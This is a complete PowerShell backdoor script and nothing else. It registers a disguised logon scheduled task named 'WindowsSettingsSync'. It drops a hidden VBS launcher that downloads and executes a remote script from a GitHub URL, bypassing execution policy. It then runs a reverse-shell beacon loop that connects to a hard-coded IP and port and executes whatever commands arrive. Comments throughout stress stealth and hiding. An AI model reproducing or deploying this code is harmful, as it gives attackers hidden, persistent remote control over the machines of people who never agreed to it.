# --- CONFIGURATION ---
$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"
$LHOST = "192.168.43.109"
$LPORT = 4444
$TaskName = "WindowsSettingsSync"

# --- 1. THE STEALTH PERSISTENCE (Scheduled Task) ---
# This creates a task that runs every time ANY user logs in, completely hidden.
if (!(Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$env:APPDATA\launcher.vbs`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force
}

# --- 2. CREATE THE SILENT LAUNCHER ---
$VBSCode = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoP -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$Url')", 0, False
"@
$VBSPath = "$env:APPDATA\launcher.vbs"
Set-Content -Path $VBSPath -Value $VBSCode -Force

# --- 3. THE BEACON LOOP ---
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
        $writer.WriteLine("--- SYSTEM ONLINE: NO ICON MODE ---")
        $reader = New-Object System.IO.StreamReader($stream)
        
        while($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $line = $reader.ReadLine()
            if ($null -eq $line -or $line -eq "exit") { break }
            $out = (Invoke-Expression $line 2>&1 | Out-String)
            $writer.WriteLine($out)
        }
        $client.Close()
    }
    catch {
        Start-Sleep -Seconds 10 # Reliable retry every 10s
    }
}
